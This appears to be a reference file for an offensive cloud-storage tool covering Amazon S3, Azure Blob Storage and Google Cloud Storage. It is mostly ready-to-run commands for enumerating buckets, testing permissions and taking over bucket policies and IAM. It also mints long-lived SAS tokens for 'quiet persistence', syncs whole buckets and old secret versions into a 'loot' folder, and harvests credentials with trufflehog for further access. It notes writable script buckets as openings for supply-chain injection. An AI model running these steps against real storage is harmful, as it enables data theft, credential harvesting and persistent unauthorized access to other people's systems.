# Provider detail: discovery, permission matrix, exfiltration

## Amazon S3

### Endpoints and existence
- Virtual-hosted: `https://<bucket>.s3.amazonaws.com/` (also
  `https://<bucket>.s3.<region>.amazonaws.com/`); path-style:
  `https://s3.amazonaws.com/<bucket>/`.
- Existence check (no creds): `curl -sI https://<bucket>.s3.amazonaws.com/`
  - `404` + `NoSuchBucket` → free name; `403 AccessDenied` → exists, anon-list
    denied; `200` → anon-listable (XML listing); `301 PermanentRedirect` → exists
    in another region (the `x-amz-bucket-region` header tells you which).
- Region matters for API calls: `aws s3api get-bucket-location --bucket b`
  (often allowed anonymously), then pass `--region`.

### Discovery tooling
```bash
python3 cloud_enum.py -k example -k example.com -t 25 -l out/ce.log   # AWS+Azure+GCP
s3scanner -bucket-file names.txt -enumerate -threads 8 -json         # exists/perms/objects
s3scanner -bucket example-prod -enumerate                            # single bucket
```
s3scanner JSON reports per bucket: `exists`, `auth_users_*` and `all_users_*`
read/write/read-acl/write-acl booleans, object count/size when listable.
Also mine: Grayhat Warfare / public bucket indexes, Wayback for
`s3.amazonaws.com` URLs, GitHub code search, `dig` CNAMEs
(`assets.example.com CNAME example-assets.s3.amazonaws.com` → takeover check if
NoSuchBucket).

### Permission matrix
```bash
# Anonymous
aws s3 ls s3://b --no-sign-request
aws s3api list-objects-v2 --bucket b --no-sign-request --max-items 20
aws s3 cp s3://b/key ./ --no-sign-request
aws s3api get-bucket-acl --bucket b --no-sign-request
aws s3api get-bucket-policy --bucket b --no-sign-request
# Any-authenticated-AWS-user: same calls WITH any AWS credential you own —
# the AuthenticatedUsers ACL grantee means literally any AWS account.
aws s3 ls s3://b --profile mine
# Victim credential
aws s3 ls s3://b --profile target
aws s3api get-public-access-block --bucket b --profile target
aws s3api get-bucket-versioning --bucket b
aws s3api get-bucket-logging --bucket b          # is access logged?
aws s3api get-bucket-encryption --bucket b
```
Reading results:
- `get-bucket-acl` grants to `http://acs.amazonaws.com/groups/global/AllUsers`
  (anonymous) or `.../AuthenticatedUsers` (any AWS account); permissions READ,
  WRITE, READ_ACP, WRITE_ACP, FULL_CONTROL. `WRITE_ACP` anywhere = you can
  rewrite the ACL = full takeover.
- `get-bucket-policy`: statements with `"Principal": "*"` or
  `"Principal": {"AWS": "*"}` — check Action and Condition; absent/weak
  conditions = public.
- `get-public-access-block`: all four flags true neutralizes public ACL/policy;
  missing (`NoSuchPublicAccessBlockConfiguration`) or false flags = exposure live.

### Write test and abuse
```bash
echo "poc vulture" > poc.txt
aws s3 cp poc.txt s3://b/poc-$RANDOM.txt --no-sign-request     # anon write
aws s3 cp poc.txt s3://b/poc.txt --profile mine                # any-authed write
aws s3api put-object-acl --bucket b --key existing.js --acl public-read --no-sign-request  # ACL write
# Policy takeover if s3:PutBucketPolicy is granted:
aws s3api put-bucket-policy --bucket b --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:root"},"Action":"s3:*","Resource":["arn:aws:s3:::b","arn:aws:s3:::b/*"]}]}'
```
Writable buckets serving web content (JS/CSS referenced by sites) = stored-XSS /
supply-chain injection. Writable + CloudFront origin = site defacement.

### Exfiltration
```bash
aws s3 sync s3://b ./loot/b --no-sign-request                  # whole bucket
aws s3 sync s3://b ./loot/b --exclude '*' --include '*.tfstate' --include '*.env' --include '*.pem' --include '*.sql'
aws s3api list-object-versions --bucket b --prefix secrets/    # deleted/overwritten versions
aws s3api get-object --bucket b --key k --version-id VID old.txt
```

## Azure Blob Storage

### Endpoints and existence
- `https://<account>.blob.core.windows.net/<container>/<blob>`; account names
  3–24 lowercase alnum, global namespace.
- Account existence: DNS — `nslookup <acct>.blob.core.windows.net` resolves iff
  the account exists. Container existence (public accounts):
  `curl -sI 'https://acct.blob.core.windows.net/c?restype=container'`
  → 200/403 exists, 404 `ContainerNotFound`.

### Discovery tooling
```bash
# MicroBurst (PowerShell):
Import-Module ./MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base example -Permutations permutations.txt -OutputFile out/blobs.txt
# cloud_enum covers Azure accounts/containers too (-k example).
```
MicroBurst brute-forces account names from the base word, then common container
names, and prints public containers + listable blobs.

### Public access levels
Container `--public-access` setting:
- `container`: anonymous LIST + READ — `?restype=container&comp=list` returns XML
  of every blob.
- `blob`: anonymous READ of known blob URLs only; listing denied (brute blob
  names: common filenames, sitemap, referenced URLs, Wayback).
- `off`/private: auth required.
Account-level `allowBlobPublicAccess=false` overrides containers to private.

```bash
curl -s 'https://acct.blob.core.windows.net/c?restype=container&comp=list'            # anon list
curl -s 'https://acct.blob.core.windows.net/c?restype=container&comp=list&include=versions&showonly=deleted'  # soft-deleted/versions (needs auth usually)
curl -sO 'https://acct.blob.core.windows.net/c/backup.zip'                            # anon read
```

### Authenticated matrix
```bash
az storage account list -o table                                       # accounts your RBAC sees
az storage account show -n acct --query allowBlobPublicAccess
az storage container list --account-name acct --auth-mode login -o table
az storage container show-permission ...                               # legacy ACL
az storage blob list --account-name acct -c c --auth-mode login -o table
az storage blob download --account-name acct -c c -n blob.txt -f ./blob.txt --auth-mode login
az storage blob download-batch --account-name acct -s c -d ./loot/acct-c --auth-mode login
# Upload (write test):
az storage blob upload --account-name acct -c c -n poc.txt -f poc.txt --auth-mode login
```
`--auth-mode login` uses your Entra token + RBAC (needs Storage Blob Data
Reader/Contributor). Without data-plane RBAC, pivot to keys or SAS.

### SAS and account-key abuse
```bash
# Use a found SAS (append to URL or pass to az):
az storage blob list --account-name acct -c c --sas-token 'sv=2022-11-02&sr=c&sp=rl&se=2031-01-01&sig=...'
curl -s 'https://acct.blob.core.windows.net/c?restype=container&comp=list&sv=...&sig=...'
# Decode SAS scope from params: sp (permissions racwdl), se (expiry), sr/srt (scope), sip (IP lock).
# Account keys (RBAC: needs Microsoft.Storage/storageAccounts/listKeys/action — Contributor has it):
az storage account keys list -g RG -n acct -o json
az storage blob list --account-name acct -c c --account-key "$KEY"
# Mint an unrestricted long-lived SAS from the key (quiet persistence):
az storage container generate-sas --account-name acct -n c --permissions acdlrw \
    --expiry 2031-01-01 --account-key "$KEY" -o tsv
az storage account generate-sas --account-name acct --services b --resource-types sco \
    --permissions acdlrw --expiry 2031-01-01 --account-key "$KEY" -o tsv
```
Account keys bypass all RBAC and container ACLs — full data-plane control over
blobs, files, queues, tables. Also check `az storage share list` /
`az storage table list` / `az storage queue list` with the same key.

## Google Cloud Storage

### Endpoints and existence
- `https://storage.googleapis.com/<bucket>/<object>` (XML API),
  `https://storage.googleapis.com/storage/v1/b/<bucket>` (JSON API),
  `https://<bucket>.storage.googleapis.com/`.
- Existence: `curl -s https://storage.googleapis.com/storage/v1/b/<bucket>` →
  404 free, 403 exists-denied, 200 metadata readable.

### Discovery tooling
```bash
python3 gcpbucketbrute.py -k example -u                 # unauth: AllUsers perms per found bucket
python3 gcpbucketbrute.py -k example -f sa.json         # authed: YOUR perms via testIamPermissions
python3 gcpbucketbrute.py -k example --check-single example-prod-backups
```
GCPBucketBrute reports exactly which `storage.*` permissions each identity holds
per bucket — including `storage.buckets.setIamPolicy` (privesc) flagged loudly.

### Permission matrix
```bash
# Anonymous (allUsers):
curl -s 'https://storage.googleapis.com/storage/v1/b/B/o'                      # list objects (JSON)
curl -s 'https://storage.googleapis.com/B/path/obj.txt' -o obj.txt             # read object
curl -s 'https://storage.googleapis.com/storage/v1/b/B/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.buckets.get&permissions=storage.buckets.setIamPolicy'
# Any-authenticated (allAuthenticatedUsers): same testPermissions call with ANY
# Google-account bearer token (a throwaway gmail identity counts):
curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  'https://storage.googleapis.com/storage/v1/b/B/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get'
# Your (victim) credential:
gcloud storage ls gs://B                       # list   (legacy: gsutil ls)
gcloud storage ls -r 'gs://B/**'               # recursive listing
gcloud storage buckets describe gs://B         # metadata, uniform access flag
gcloud storage buckets get-iam-policy gs://B   # look for allUsers / allAuthenticatedUsers bindings
gsutil acl get gs://B && gsutil defacl get gs://B    # legacy ACLs (non-uniform buckets)
```
`testPermissions` responds with only the permissions you HOLD — an empty `{}` =
nothing; presence of `storage.objects.get` = read; `storage.objects.create` =
write; `storage.buckets.setIamPolicy` = takeover.

### Write test and IAM abuse
```bash
printf 'poc vulture' > poc.txt
gcloud storage cp poc.txt gs://B/poc.txt
# Anonymous write via XML API if allUsers has objectCreator:
curl -s -X PUT --data-binary @poc.txt 'https://storage.googleapis.com/B/poc.txt'
# setIamPolicy takeover:
gcloud storage buckets add-iam-policy-binding gs://B \
    --member=user:operator@example.com --role=roles/storage.admin
gcloud storage buckets add-iam-policy-binding gs://B --member=allUsers --role=roles/storage.objectViewer   # make public
```

### Exfiltration
```bash
gcloud storage cp -r gs://B ./loot/B
gsutil -m cp -r gs://B ./loot/B                        # parallel legacy
gcloud storage ls -r 'gs://B/**.tfstate' 'gs://B/**.env' 'gs://B/**.json'
# Object versioning / soft-deleted generations:
gcloud storage ls -a gs://B/path/                      # -a lists noncurrent generations
gcloud storage cp 'gs://B/secrets.env#1700000000000000' ./old-secrets.env
```

## Loot triage (all providers)

Priority objects: `*.tfstate` (plaintext secrets + full infra map), `*.env`,
`*.pem/*.key/*.p12/*.pfx`, `*.sql/*.dump/*.bak`, `config.*`/`settings.*`,
`id_rsa*`, `.git/` directories (full repo recovery), CI logs, `*.har`,
mobile app bundles. Run **trufflehog**:

```bash
trufflehog filesystem ./loot --json > out/trufflehog.json
trufflehog s3 --bucket=B --json              # scan in place, no full sync needed
trufflehog gcs --project-id=example-prod-123456 --json
```
Verified credentials from trufflehog → **cloud-credential-enumeration** (the loop).

## Access-level vocabulary (used by probe_storage.py and findings)

| Level | Meaning |
|---|---|
| `none` | name does not exist |
| `exists` | exists, all probes denied |
| `listable` | object listing succeeded |
| `readable` | object content retrieved (may hold without listable — blob-level public) |
| `writable` | PoC object upload succeeded |
| `admin` | ACL/policy/IAM write confirmed |
